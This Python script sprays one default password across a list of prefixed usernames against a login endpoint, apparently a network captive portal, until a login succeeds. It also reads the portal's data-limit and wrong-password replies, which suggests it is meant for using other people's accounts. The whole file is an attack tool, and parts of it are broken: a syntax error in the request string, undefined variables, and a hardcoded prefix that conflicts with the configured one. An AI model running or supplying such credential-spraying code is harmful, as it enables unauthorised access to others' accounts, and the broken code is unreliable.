import urllib.request
import re
import random
import time 

HOST_URL = 'host_login_url'
USERNAME_LIST = []  #without prefix
USERNAME_PREFIX = "default_prefix"
CHOICE = ''
PASSWORD = "default_password"

def tryUser(USERNAME_LIST):
    try:
            req = urllib.request.Request(host_url)
            data = 'mode=191&username='USERNAME_PREFIX+USERNAME_LIST+'&password='+PASSWORD+'&a=1355344698415' 
            data = data.encode('utf-8')
            get = urllib.request.urlopen(host_url,data)
            getData = get.read()
            getData = getData.decode('ascii')
            message = re.findall(r'<message>(.*?)</message>',str(getData))
            return message[0]
        
    except urllib.error.URLError as err:
            print(str(err))

num = 0
# Make a temporary list of the Usernames
tempList = username
while(1):
    try:
        # Randomly pick usernames and distribute load
        choice = random.choice(tempList)
        try:
            message = tryUser(choice)
            if(message == '<![CDATA[You have successfully logged in]]>'):
                print('Logged In As ' + 'f201'+choice)
                break
            else:
                if(message == '<![CDATA[Your data transfer has been exceeded, Please contact the administrator]]>'):
                    print('Connection Failed for '+USERNAME_PREFIX+CHOICE+'. Data Limit has already exceeded.')
                if(message == '<![CDATA[The system could not log you on. Make sure your password is correct]]>'):
                    print('Connection Failed for '+USERNAME_PREFIX+CHOICE+' due to incorrect password.')
                num=num+1
            # Pop incorrect choice from list
            tempList.remove(choice)
            # Optional time delay
            time.sleep(0.1)
        except:
            # Exhausted our list and couldn't log in
            print("End of list reached. Couldn't log in :(")
            break
    except:
        # Network error
        print("Login failed due to network error. Please try again.")